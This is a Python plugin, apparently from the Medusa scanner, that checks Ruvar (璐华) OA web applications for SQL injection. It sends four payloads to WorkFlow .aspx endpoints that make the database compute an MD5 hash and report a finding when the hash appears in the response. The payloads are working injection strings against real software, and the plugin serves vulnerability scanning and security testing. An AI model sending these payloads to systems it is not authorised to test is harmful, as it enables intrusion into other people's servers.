#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "Ruvar_multi_sqli3"  # 插件名称
        self.info['name'] ='璐华OA_SQL注入' #漏洞名称
        self.info['affects'] = "璐华OA"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payloads = ["/WorkFlow/OfficeFileDownload.aspx?filename=1%27AnD%20%28Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))%29%3E0--",
                "/WorkFlow/wf_work_stat_setting.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkFlow/wf_work_form_save.aspx?office_missive_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))",
                "/WorkFlow/wf_get_fields_approve.aspx?template_id=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+ ':' + str(port)+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            # if ProxyIp!=None:
            #     proxies = {
            #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
            #         "http": "http://" + str(ProxyIp)
            #     }
            #     resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            # elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
                Medusa = "{}存在璐华OA_SQL注入 \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
                _t = VulnerabilityInfo(Medusa)
                web = ClassCongregation.VulnerabilityDetails(_t.info)
                web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危

    except:
            _ = VulnerabilityInfo('').info.get('algroup')
            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
    Medusas_str = ''
    for i in Medusas:
        Medusas_str = Medusas_str + i
    return (str(Medusas_str))
